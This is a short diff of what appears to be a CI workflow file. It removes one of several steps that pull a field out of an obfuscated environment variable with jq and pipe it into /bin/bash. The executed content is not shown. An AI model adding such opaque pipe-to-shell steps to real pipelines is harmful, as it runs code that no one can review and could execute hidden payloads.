@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$aua1472" | jq -r .cz6 | /bin/bash
           echo $tyne71834 | jq -r .tt812 | /bin/bash
-          printf '%s' "$pa4227" | jq -r .dkfss00 | /bin/bash
           printf '%s' "$g7619" | jq -r .veh8 | /bin/bash
 
       - name: Upload results
